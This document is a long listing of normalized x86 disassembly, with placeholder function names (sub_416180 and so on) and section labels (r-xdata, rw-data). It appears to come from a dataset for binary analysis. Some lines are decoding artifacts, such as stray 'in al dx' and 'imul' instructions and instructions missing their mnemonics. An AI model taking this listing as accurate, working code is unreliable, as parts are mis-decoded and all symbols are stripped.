mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040ac
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40451c
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404010
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404010
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_416180
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404010
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404010
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4161d8
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040ac
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40451c
mov al 0x1
inc ebx
sub_416230
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4162a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405628
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410e1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4162ae
lea eax [ ebp - 0x4 ]
call sub_405628
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_41072c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405628
mov ecx eax
mov eax esi
pop edx
call sub_40cdb4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405628
sub_4162b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41635a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416361
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040ac
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419888
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407c68
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41637c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413a24
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413a24
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41386c
sub_4163b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413a24
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413a24
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4138b8
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41386c
sub_4163fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416595
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413d34
mov edi eax
xor edx edx
push ebp
push sub_416576
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41657d
mov eax [ rw-data ]
call sub_413d98
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416557
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416505
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4139c8
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413514
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41650c
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410858
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41637c
pop ecx
mov edx esi
mov eax edi
call sub_4138b8
mov eax ebx
call sub_40326c
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4162b4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_4163b4
pop ecx
inc esi
sub_41650c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
sub_4165a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413d34
mov edi eax
xor eax eax
push ebp
push sub_41663f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
mov edx ebx
mov eax edi
call sub_4139c8
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4138b8
mov eax esi
call sub_40326c
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407c68
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416650
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413d34
mov edi eax
xor eax eax
push ebp
push sub_4166c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
mov edx ebx
mov eax edi
call sub_4139c8
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4138b8
mov eax esi
call sub_40326c
sub_4166f8
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
pop ecx
pop edx
pop ebx
retn
sub_41673c
push ebx
push esi
push edi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41607c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_416778
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418650
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418760
call sub_4166ec
sub_41679c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407c68
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403fbc
sub_4167d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407c68
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418650
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416891
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_416c14
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_416c14
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416898
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418760
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_4166ec
sub_4168c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_4168e0
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404258
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034f0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_4166ec
sub_416948
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413d34
mov esi eax
xor edx edx
push ebp
push sub_4169b8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169bf
mov eax [ rw-data ]
call sub_413d98
retn
mov edx ebx
mov eax esi
call sub_4139c8
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_40326c
mov edx ebx
mov eax esi
call sub_4138b8
sub_4169c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416ad3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ada
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
xor edx edx
push ebp
push sub_416ab6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b08
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_4161d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4139c8
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404054
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4162b4
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4139c8
call sub_416948
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4139c8
mov edx eax
mov eax [ rw-data ]
call sub_413cac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413abc
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416ae4
push ebx
mov ebx eax
mov eax ebx
call sub_416bd8
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_415640
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416b08
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_40326c
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4139c8
call sub_40326c
inc edi
dec esi
jne r-xdata
sub_416b44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031b4
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_41305c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031f8
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4130d4
mov edi eax
mov edx [ esp + 0x4 ]
call sub_412fd4
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031d0
test al al
jne r-xdata
sub_416c14
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416c60
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416c60
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_416cb0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_416cfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4184b0
mov eax [ ebp - 0x4 ]
call sub_40427c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d02
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
call sub_4166ec
sub_416d08
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_416da8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4168ac
test al al
jne r-xdata
mov eax ebx
call sub_4168ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414200
jmp r-xdata
mov eax ebx
call sub_416bf0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416daf
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4141e0
mov esi eax
mov eax ebx
call sub_417810
jmp r-xdata
mov eax ebx
call sub_417760
mov eax ebx
call sub_4168ac
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41797c
mov eax ebx
call sub_417818
sub_416dd8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404db4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41386c
inc esi
dec ebx
jne r-xdata
sub_416e14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4199a4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404db4
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f70
add esp 0x4
mov edx ebx
mov eax edi
call sub_419978
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404db4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_419978
test [ eax + 0x24 ] 0x4
je r-xdata
sub_416e8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404db4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_416ef4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_416f14
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_416ef4
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418944
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_40326c
sub_416f74
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41705a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418ae4
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41702e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41705f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416f14
pop ecx
test al al
jne r-xdata
call sub_403a74
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a20
sub_417084
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4170fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403468
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413514
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417101
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416f14
pop ecx
test al al
jne r-xdata
call sub_403a74
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a20
sub_417124
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41719f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418ae4
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403468
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4171a4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416f14
pop ecx
test al al
jne r-xdata
call sub_403a74
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a20
sub_4171c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4173e9
push [ fs : eax ]
mov [ fs : eax ] esp
